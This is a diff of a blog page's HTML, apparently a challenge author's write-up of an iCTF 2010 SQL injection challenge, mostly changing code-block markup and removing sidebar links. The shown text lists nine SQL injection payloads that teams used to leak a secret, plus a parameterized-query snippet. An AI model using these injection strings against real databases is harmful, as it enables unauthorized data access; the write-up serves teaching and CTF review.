@@ -187,26 +187,24 @@ exploited the <span class="caps">SQL</span> injection vulnerability that provide
 The secret is:
 <a href="http://hackiswack.com/videos/viewvideo/23/hack-is-wack/blocka-blocka">http://hackiswack.com/videos/viewvideo/23/hack-is-wack/blocka-blocka</a></p>
 <p>The 8 successful control files sent over the course of the competition&nbsp;were:</p>
-<div class="highlight"><pre><span></span>a\n50\ninfo &#39;OR(1)LIMIT/**/5,1--\n
-zzyzx\n83\ninfo &#39;/**/OR/**/pass&amp;lt;83;/*\n
+<div class="highlight"><pre><span></span><code>a\n50\ninfo &#39;OR(1)LIMIT/**/5,1--\n
+zzyzx\n83\ninfo &#39;/**/OR/**/pass&lt;83;/*\n
 a\n50\ninfo 0&#39;/**/or/**/pass=&#39;66\n
 zzyzx\n83\ninfo root&#39;OR&#39;1&#39;=&#39;1&#39;LIMIT&#39;5&#39;,&#39;1\n
 user\n50\ninfo ab&#39;or/**/oid=6;--\n
 a\n50\ninfo &#39;/**/or/**/oid=6;--\n
 zzyzx\n83\ninfo &#39;/**/or/**/user/**/like&#39;s%
 zzyzx\n83\ninfo &#39;OR(user=&#39;secret&#39;)--\n
-</pre></div>
-
+</code></pre></div>
 
 <p>My own control file used in&nbsp;testing:</p>
-<div class="highlight"><pre><span></span>a\n50\ninfo z&#39;or&quot;user&quot;=&#39;secret
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>a\n50\ninfo z&#39;or&quot;user&quot;=&#39;secret
+</code></pre></div>
 
 <p>I think the fact that just over one third of the teams in our hacking
 competition discovered this vulnerability shows how dangerous it can be, and
 hence the title, Fear the <span class="caps">EAR</span>.</p>
-<div class="highlight"><pre><span></span><span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">DATABASE</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><code><span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">DATABASE</span><span class="p">)</span>
 <span class="k">try</span><span class="p">:</span>
     <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;select * from users where user=?&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">user</span><span class="p">,))</span>
     <span class="n">result</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
@@ -222,8 +220,7 @@ hence the title, Fear the <span class="caps">EAR</span>.</p>
     <span class="bp">self</span><span class="o">.</span><span class="n">process_command</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="o">*</span><span class="n">cmd</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">))</span>
 <span class="k">finally</span><span class="p">:</span>
     <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>You can find the complete source code for this challenge <a href="http://cs.ucsb.edu/~bboe/public/src/ictf2010_challenge6.tar.gz">here</a>. It simply
 requires running a single python file. The bug in the code that produces the
@@ -294,10 +291,6 @@ will help me create better challenges for next year&#8217;s&nbsp;iCTF.</p>
                       <a href="http://www.linkedin.com/in/bbzbryce">linkedin</a>
                     </li>
                     <li class="list-group-item">
-                      <a href="https://plus.google.com/+BryceBoe?rel=author"><i class="fa fa-google-plus fa-lg"></i></a>
-                      <a href="https://plus.google.com/+BryceBoe?rel=author">google+</a>
-                    </li>
-                    <li class="list-group-item">
                       <a href="https://twitter.com/bboe"><i class="fa fa-twitter fa-lg"></i></a>
                       <a href="https://twitter.com/bboe">twitter</a>
                     </li>
@@ -344,11 +337,6 @@ will help me create better challenges for next year&#8217;s&nbsp;iCTF.</p>
         <li class="list-group-item">
             <a href="http://adamdoupe.com/" target="_blank">
                 Adam Doupé
-            </a>
-        </li>
-        <li class="list-group-item">
-            <a href="http://juliebifano.com/" target="_blank">
-                Julie Bifano
             </a>
         </li>
       </ul>
